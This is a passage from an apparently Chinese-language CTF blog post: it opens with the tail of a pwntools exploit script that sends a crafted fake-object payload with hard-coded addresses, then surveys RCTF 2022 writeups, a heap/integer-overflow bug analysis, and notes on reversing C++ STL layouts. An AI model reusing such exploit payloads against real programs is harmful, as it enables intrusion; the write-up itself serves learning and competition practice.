class="hljs-number">20</span>+<span class="hljs-number">48</span>+<span class="hljs-number">4</span>])<br><span class="hljs-comment"># 一串\x00就是为了跳过Game class的内存. </span><br>pl2 = flat([<span class="hljs-string">b&#x27;fake_bot&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">20</span>+<span class="hljs-number">48</span>-<span class="hljs-number">8</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF4E</span>, <span class="hljs-number">0x804AF4E</span>])<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(pl1)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#gdb.attach(p, &#x27;b *0x804AA96\nc&#x27;)</span><br><span class="hljs-comment">#input(&#x27;wait for gdb&#x27;)</span><br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(pl2)<br><br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure>

<p>这个exp的问题是由于先手是随机的但是并未检测先手, 导致一半概率达不到想要的结果. 多试两次或者再写个大循环catch exception. </p>
<h1 id="RCTF-2022"><a href="#RCTF-2022" class="headerlink" title="RCTF 2022"></a>RCTF 2022</h1><h2 id="general-wp"><a href="#general-wp" class="headerlink" title="general wp"></a>general wp</h2><ul>
<li>RCTF 2022 writeup by W&amp;M <a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/35/">https://blog.wm-team.cn/index.php/archives/35/</a> </li>
<li>RCTF 2022 pwn bfc offical wp <a target="_blank" rel="noopener" href="https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc">https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc</a> </li>
<li>RCTF 2022 bfc wp <a target="_blank" rel="noopener" href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc</a> </li>
<li>RCTF2022 wp by b3f0re  <a target="_blank" rel="noopener" href="https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md">https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md</a> </li>
<li>RCTF 2022 Official Writeup - Crypto Part <a target="_blank" rel="noopener" href="https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part">https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part</a> </li>
<li>RCTF 2022 writeup by Nu1L [233](<a target="_blank" rel="noopener" href="https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF">https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF</a> WriteUp By Nu1L.pdf&amp;e=1670928565&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mB8kQYKlYDn-S3ySMDt9Dt9P1L8=) </li>
<li>RCTF2022-MyCarsShowSpeed Writeup <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-275512.htm">https://bbs.pediy.com/thread-275512.htm</a></li>
<li>OFFICIAL WP <a target="_blank" rel="noopener" href="https://blog.rois.io/2022/rctf-2022-official-write-up/">https://blog.rois.io/2022/rctf-2022-official-write-up/</a></li>
</ul>
<h2 id="MyCarShowSpeed"><a href="#MyCarShowSpeed" class="headerlink" title="MyCarShowSpeed"></a>MyCarShowSpeed</h2><ul>
<li><p>New a Game</p>
<ul>
<li>stability, performance. 真看不出来漏洞…..</li>
</ul>
</li>
<li><p>Show Information</p>
<ul>
<li>….</li>
</ul>
</li>
<li><p>Visit The Store</p>
<ul>
<li><p>Buy Goods: </p>
<ul>
<li>SuperTire没有一点效果. 但是这有什么特别的含义呢. </li>
<li>有钱买flag之后但是wintimes过少会触发没收车辆. 有什么特别的地方?</li>
</ul>
<p>**还真有特别的地方, 回过头来看很明显可以先fix car从carlist上删除该车之后(共拥有两辆车以上), 再来买flag, 直接把剩下的也删掉了, carNum归零. ** </p>
<ul>
<li>没看出来……</li>
</ul>
</li>
<li><p>Sell Goods:</p>
<ul>
<li>在链表上直接把指针置空当做是删除了车辆. 并没有删除节点. </li>
</ul>
</li>
<li><p>Fix Cars</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">car-&gt;fixTime = time(<span class="hljs-literal">NULL</span>);<br>car-&gt;fixed = <span class="hljs-number">1</span>;<br>_this-&gt;carList-&gt;addCar(car, _this-&gt;carList);<br>_this-&gt;carList-&gt;carNums++;<br><span class="hljs-keyword">if</span>(carList-&gt;carNums &gt; <span class="hljs-number">1</span>)<br>&#123;<br>    car-&gt;isTaken = <span class="hljs-number">1</span>;<br>    carList-&gt;deleteCar(car, &amp;carList);<br>    carList-&gt;carNums--;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We will temporily take your car and fix it soon!&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We&#x27;ll soon fix it!&quot;</span>);<br></code></pre></div></td></tr></table></figure>

<p>所有的车大于一辆时就会从车库中(<code>carList</code>)删除这辆车. 而不仅仅是fixed变成1. </p>
</li>
<li><p>Fetch Cars</p>
<ul>
<li>整数溢出错误</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fixDifficulty = car-&gt;fixDifficulty;<br>fixedTime = fixDifficulty * time(<span class="hljs-number">0LL</span>) - car-&gt;fixTime;<br>cost = (<span class="hljs-keyword">int</span>)(<span class="hljs-number">0.1</span> * (<span class="hljs-keyword">double</span>)(<span class="hljs-keyword">int</span>)fixedTime) + <span class="hljs-number">5</span>;<br></code></pre></div></td></tr></table></figure>

<p>可以看出time()返回的巨大时间戳值乘以fixDifficulty后会溢出, 而结果使用int类型, 造成溢出为负数. 测了下只要第二次就可以. </p>
<img src="../../image/recent_ctf/image-20230101151729612.png" srcset="/img/loading.gif" lazyload alt="image-20230101151729612" style="zoom: 80%;" /></li>
</ul>
</li>
</ul>
<ol start="5">
<li>Leave</li>
</ol>
<ul>
<li><p>Switch Cars</p>
</li>
<li><p>Rules</p>
</li>
</ul>
<ol start="6">
<li>Quit</li>
</ol>
<p>?????????????????????????????????????????鉴定为烂, 根本不知道哪个文件是远程环境使用的, 被整晕了, 不做了. 本质是tcache利用.</p>
<img src="../../image/recent_ctf/image-20230101233406596.png" srcset="/img/loading.gif" lazyload alt="image-20230101233406596" style="zoom:80%;" />

<h2 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h2><blockquote>
<p>C++逆向. 看到了std::string和std::map的逆向代码. 如果要看懂应该要找找stl的逆向教程.</p>
</blockquote>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270547.htm">浅谈STL容器识别</a></strong> (注意链接是MSVC版本, GNU版本在下方)</li>
</ul>
<p>开课了, C++基础班. 看了几个深蓝色的链接, 深感知识匮乏啊, 真不愧是C++.</p>
<img src="../../image/recent_ctf/image-20230102183226852.png" srcset="/img/loading.gif" lazyload alt="image-20230102183226852" style="zoom:33%;" />

<ul>
<li><p><a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/using_declaration">using statement</a>. can be used to introduce a member of base class into derived class definition. </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/keyword/typename">typename keyword</a> :  Inside a declaration or a definition of a template, typename can be used to declare that a <a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/dependent_name">dependent qualified name</a> is a type.</p>
<p><strong>then, what is qualified name??</strong>  </p>
<ul>
<li>A qualified name may refer to a<ul>
<li>class member (including static and non-static functions, types, templates, etc)</li>
<li>namespace member (including another namespace)</li>
<li>enumerator</li>
</ul>
</li>
<li>For an <em>unqualified</em> name, that is a name that does not appear to the right of a scope resolution operator <strong><code>::</code></strong>, name lookup sequence depend on reference position(such as global, in namespace, Non-member function definition, etc.)</li>
</ul>
<p><strong>finally, what is the word <em>dependent</em> ?</strong> </p>
<ul>
<li>not determined by template arguments. </li>
</ul>
</li>
<li><p>所以, STL源码中class内部的<code>using _Nodeptr = typename _Val_types::_Nodeptr;</code>也就可以理解了</p>
</li>
<li><p>map和set:</p>
<ul>
<li>使用的红黑树: 在查询上最多比平衡二叉树多一次查找, 但是在插入和删除的时候更为高效, 因为其不追求完全的平衡, 减少了大量的平衡性计算.</li>
</ul>
</li>
</ul>
<p style="font-size:large;font-weight:bold"> 得出结论, MSVC会内联一些代码导致看起来分不清楚, 但是g++编译的话会出现默认allocator的定义后再构造string或者对应的容器, 已经相当简洁了不用在区分容器上过多分析</p>

<p>但是在逆向文件时发现有不少奇怪函数, 并没有找到教程之类的东西, 有一本RE4B勉强看看吧, 就从这里入个门.</p>
<p>STL源码也不一定要看, 主要是代码和反编译出来的东西的对应. 注意到上面链接中的是msvc版本的STL, 而GNU的STL在下面</p>
<p>link: <a target="_blank" rel="noopener" href="https://leezw.net/assets/pdf/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.pdf">SGI-STL BOOK</a> | <a target="_blank" rel="noopener" href="https://github.com/steveLauwh/SGI-STL">SGI_STL Repo</a> | <a target="_blank" rel="noopener" href="https://github.com/arkingc/note/blob/master/C++/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.md">book note</a> | <a target="_blank" rel="noopener" href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/basic_string.h">GNU STL</a> | </p>
<h3 id="STL-REVERSING"><a href="#STL-REVERSING" class="headerlink" title="STL REVERSING"></a>STL REVERSING</h3><blockquote>
<p>吾爱找的IDA的DWARF解析出问题, 导致有符号版示例源码变量显示不全, IDA FREE没有这个问题. 明天重下个IDA看看. free版本的使用cloud decompiler实在有点慢, 不过倒也能接受. </p>
</blockquote>
<h4 id="示例用源码"><a href="#示例用源码" class="headerlink" title="示例用源码:"></a>示例用源码:</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  map&lt;string, <span class="hljs-keyword">int</span>&gt; m;<br>  string fuckkey = <span class="hljs-string">&quot;fuck&quot;</span>;<br>  m[fuckkey] = <span class="hljs-number">1</span>;<br><br>  set&lt;<span class="hljs-keyword">int</span>&gt; s;<br>  s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">10</span>);<br><br>  vector&lt;string&gt; v;<br>  v.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;vector string&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>无符号和有符号:</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">59</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  <span class="hljs-keyword">char</span> v10[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  <span class="hljs-keyword">char</span> v11[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  <span class="hljs-built_in">sub_2648</span>(v7, a2, a3);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  <span class="hljs-built_in">sub_2834</span>(v6, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;v8);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  *(_DWORD *)<span class="hljs-built_in">sub_28D4</span>(v7, v6) = <span class="hljs-number">666</span>;<br>  <span class="hljs-built_in">sub_26B8</span>(v5);<br>  v9 = <span class="hljs-number">10</span>;<br>  <span class="hljs-built_in">sub_2A5C</span>(v5, &amp;v9);<br>  <span class="hljs-built_in">sub_2728</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2834</span>(v10, <span class="hljs-string">&quot;vector string&quot;</span>, v11);<br>  <span class="hljs-built_in">sub_2B90</span>(v4, v10);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2B4C</span>(v4);<br>  <span class="hljs-built_in">sub_26D4</span>(v5);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v6);<br>  <span class="hljs-built_in">sub_2664</span>(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  std::vector&lt;..::basic_string&lt;... &gt;,std::allocator&lt;..::basic_string&lt;...&gt; &gt; &gt; v; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt; s; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  std::string fuckkey; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  std::map&lt;..::basic_string&lt;... &gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;... &gt; &gt;,allocator &gt; m; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; __a; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt;::value_type __x; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  ..::basic_string&lt;... &gt; v10; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; v11; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..&gt;::basic_string&lt;...&gt;&gt;,allocator&gt;::<span class="hljs-built_in">map</span>(&amp;m);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;__a, argv);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;fuckkey, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;__a);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;__a);<br><br>  *std::map&lt;..&gt;::basic_string&lt;&gt;::<span class="hljs-keyword">operator</span>[](<br>     &amp;m,<br>     &amp;fuckkey) = <span class="hljs-number">666</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">set</span>(&amp;s);<br>  __x = <span class="hljs-number">10</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">insert</span>(&amp;s, &amp;__x);<br><br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v11, &amp;__x);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(<br>    &amp;v10,<br>    <span class="hljs-string">&quot;vector string&quot;</span>,<br>    &amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">push_back</span>(<br>    &amp;v,<br>    &amp;v10);<br>  <span class="hljs-comment">//Destructor</span><br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::~<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">set</span>(&amp;s);<br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;fuckkey);<br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;...&gt;&gt;,allocator&gt;::~<span class="hljs-built_in">map</span>(&amp;m);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h4><ul>
<li>For a reverse iterator <code>r</code> constructed from an iterator <code>i</code>, the relationship &amp;<em>r == &amp;</em>(i-1) is always true !!!!!!!!!!!!!!<br>这就是为什么rbegin()会看到一个<code>*a1 -= 8</code>. 这个只是vector的迭代器, 其余结构迭代器有待分析. </li>
</ul>
<p><img src="../../image/recent_ctf/range-rbegin-rend.svg" srcset="/img/loading.gif" lazyload alt="range-rbegin-rend.svg"></p>
<ul>
<li>如下方表格, 其中a–(或者a++)的内部有流程就是如此, </li>
</ul>
<table>
<thead>
<tr>
<th align="center">Expression</th>
<th align="center">Return</th>
<th align="center">Equivalent expression</th>
</tr>
</thead>
<tbody><tr>
<td align="center">–a</td>
<td align="center">It&amp;</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">a–</td>
<td align="center">convertible to const It&amp;</td>
<td align="center">It temp = a; <br />–a;<br />return temp;</td>
</tr>
<tr>
<td align="center">*a–</td>
<td align="center">reference</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>**要注意到, 上面表格的temp在编译中发现来自<code>operator++()</code>上层函数当做参数传入的局部变量, 会有基于局部变量空间的相应迭代器构造函数执行, 然后进入<code>operator--()</code>, 最后返回temp也就是传入的指针. </p>
</li>
<li><p>还有一点问题, 库函数似乎是<code>__fastcall</code>类型, 如果文件带上符号IDA大概率识别成<code>__cdecl</code>, 而且两个版本设置call type时什么都不做都能报错, 加上7.5版本反编译相关函数时也无法自动识别, 但是8.1可以. 还是用新的吧. 但是新版的把allocator less啥的都标出来, 显得函数名非常非常的长. 也是一个缺点(?)吧. </p>
</li>
<li><p>begin()的流程: </p>
<ul>
<li>使用临时变量存储iter(有效字段就8字节), </li>
<li>然后调用相应iterator构造函数(其实就是<code>this-&gt;_M_node = __x</code>这样的)</li>
<li>直接return返回<code>__x</code>对应的指针.</li>
</ul>
</li>
<li><p>rbegin()的流程: 显而易见. 还是使用了临时变量. 然后再构造反向迭代器. </p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::reverse_iterator __fastcall std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">rbegin</span>(<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>,<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *a2)<br>&#123;<br>  std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::iterator v2; <span class="hljs-comment">// rax</span><br><br>  v2._M_current = std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">end</span>(a2)._M_current;<br>  std::reverse_iterator&lt;__gnu_cxx::__normal_iterator&lt;enc **,std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(<br>    <span class="hljs-keyword">this</span>,<br>    v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
<li></li>
</ul>
<h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><blockquote>
<p><del>64位下占用32字节,</del> 感觉不是很固定啊, 还是得看具体的架构和系统. 就拿64位linux版gcc编译的吧. </p>
</blockquote>
<p>64位下占用32字节. 差点忘记class的实现是先在栈上分配空间然后构造时把this指针(指向栈上)放到构造函数的第一个位置, 找相应构造函数半天没看到原来是这样.  就是这个<code>basic_string( const CharT* s, const Allocator&amp; alloc = Allocator() );</code>, 可以查到各种std::string std::wstring等就是basic_string模板的实例化. </p>
<p>string所有的构造函数都在basic_string里查找即可, 全局string和其他全局变量的构造函数一起被加入为构造函数指针数组, 在<code>_do_global_ctors</code>之类的函数里按顺序执行. main里面的string按照局部class变量分配和使用空间.</p>
<blockquote>
<p>这个所谓的allocator就占用一字节, 懒得探究这是什么了. </p>
</blockquote>
<p><del>搞不明白这32字节是什么东西, 暂时放弃.</del> 可以看下面的源码分析. </p>
<p>从题目中学到的:</p>
<ul>
<li>substr其实不止两个参数, 反编译时会有四个参数, 第一个参数是一个栈上临时string变量, 用来接收substr的返回值, 如果没有赋值就直接析构了; 如果再对返回值用上<code>operator[]()</code>其实是对临时string的成员函数调用, 没有调用后立刻被销毁了. </li>
<li>在源码中看到C++11版本和之前的string内存布局不相同, 不过想来至少都用上了11, 就拿这个为基准了. </li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">_Alloc_hider    _M_dataplus;    <span class="hljs-comment">//__Alloc_hider里面又有...如下</span><br>size_type        _M_string_length;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span> _S_local_capacity = <span class="hljs-number">15</span> / <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(_CharT) &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br>  _CharT           _M_local_buf[_S_local_capacity + <span class="hljs-number">1</span>];<br>  size_type        _M_allocated_capacity;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>​        而第一行<code>__Alloc_hider</code>里面又有</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">pointer _M_p; <span class="hljs-comment">// The actual data.</span><br></code></pre></div></td></tr></table></figure>

<p>​        所以对于<code>typedef basic_string&lt;char&gt; string</code>来说就是8+8+16=32字节. C++11特有, 其他版本未看. </p>
<ul>
<li><strong>对于&lt;=15字节的数据会存放在部分而里面, 大于则在堆上分配</strong>. </li>
<li></li>
</ul>
<h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p><del>也是32字节</del>. 其实是24字节. </p>
<p>构造函数还是一如既往的套娃清零函数. <code>_Vector_base</code>和<code>_Vector_impl::_Vector_impl</code>之类的函数. 在第三层调用allocator, 其实啥也没干就返回了.</p>
<p>我算是看明白这个32字节的布局了, 源码里找半天. 在<code>gcc/libstdc++-v3/include/bits/stl_vector.h</code>里前几行就是_Vector_base, 定义了一些基本的内存布局和一堆构造析构(原来struct也能有构造之类的), 然后vector就定义operator之类的有实际作用的库函数. 嗯, 也可以在IDA里直接查看class, 不用追究细节还更快一点. </p>
<p>其中:</p>
<ul>
